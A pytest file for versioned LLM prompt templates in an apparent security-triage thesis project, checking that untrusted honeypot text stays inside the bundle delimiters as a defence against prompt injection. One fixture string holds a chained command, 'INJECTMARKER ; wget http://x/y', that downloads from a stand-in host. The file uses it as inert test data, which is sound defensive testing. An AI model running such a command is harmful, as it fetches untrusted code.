"""Tests for the versioned prompt templates (E6-02, SCRUM-36)."""

from __future__ import annotations

import pytest

from thesis.config import Provenance
from thesis.prompts.render import (
    BUNDLE_CLOSE,
    BUNDLE_OPEN,
    TEMPLATE_VERSION,
    PromptTemplate,
    render,
    static_prefix,
)
from thesis.prompts.templates import baseline_b, classification, evidence, recommendation
from thesis.prompts.templates._shared import REASONING

ALL = [evidence.TEMPLATE, classification.TEMPLATE, recommendation.TEMPLATE, baseline_b.TEMPLATE]

VIEW_A = '{"bundle_id":"a","honeypot":{"exemplars":[{"cmd":"INJECTMARKER ; wget http://x/y"}]}}'
VIEW_B = '{"bundle_id":"b","flows":{"count":3}}'


@pytest.mark.parametrize("template", ALL, ids=lambda t: t.name)
def test_static_prefix_is_identical_for_every_bundle(template: PromptTemplate) -> None:
    prompt_a = render(template, VIEW_A)
    prompt_b = render(template, VIEW_B)
    prefix = static_prefix(template)
    assert prompt_a.startswith(prefix)
    assert prompt_b.startswith(prefix)
    # The bytes before the bundle content are the same regardless of the bundle.
    assert prompt_a.split(BUNDLE_OPEN)[0] == prompt_b.split(BUNDLE_OPEN)[0]


@pytest.mark.parametrize("template", ALL, ids=lambda t: t.name)
def test_honeypot_text_only_inside_delimiters_and_away_from_schema(
    template: PromptTemplate,
) -> None:
    prompt = render(template, VIEW_A)
    assert prompt.count("INJECTMARKER") == 1  # honeypot text appears once, in the bundle
    i_marker = prompt.index("INJECTMARKER")
    i_open = prompt.index(BUNDLE_OPEN)
    i_close = prompt.index(BUNDLE_CLOSE)
    assert i_open < i_marker < i_close  # strictly inside the frozen delimiters
    i_schema = prompt.index("## Output schema")
    i_task = prompt.index("## Task")
    # At least one non-honeypot section (the Task, nearest the bundle) separates schema and bundle.
    assert i_schema < i_task < i_open


@pytest.mark.parametrize("template", ALL, ids=lambda t: t.name)
def test_version_is_the_frozen_set_version_and_recordable(template: PromptTemplate) -> None:
    assert template.version == TEMPLATE_VERSION
    prov = Provenance(
        model="m",
        model_revision="r",
        provider="p",
        temperature=0.6,
        top_p=0.9,
        max_tokens=250,
        seed=None,
        prompt_template_version=template.version,
        graph_version="graph-v1.0",
    )
    assert prov.prompt_template_version == TEMPLATE_VERSION


@pytest.mark.parametrize("template", ALL, ids=lambda t: t.name)
def test_reasoning_instructions_are_present(template: PromptTemplate) -> None:
    assert REASONING in render(template, VIEW_B)  # never trimmed (§4.4)


def test_only_recommendation_and_baseline_carry_the_action_catalog() -> None:
    assert "no_action" in render(recommendation.TEMPLATE, VIEW_B)
    assert "isolate_device" in render(baseline_b.TEMPLATE, VIEW_B)
    assert "no_action" not in render(evidence.TEMPLATE, VIEW_B)
    assert "no_action" not in render(classification.TEMPLATE, VIEW_B)


def test_template_validation_rejects_bad_section_order() -> None:
    with pytest.raises(ValueError, match="Role"):
        PromptTemplate(name="x", version=TEMPLATE_VERSION, sections=(("Task", "t"),))
    with pytest.raises(ValueError, match="Output schema"):
        PromptTemplate(name="x", version=TEMPLATE_VERSION, sections=(("Role", "r"), ("Task", "t")))
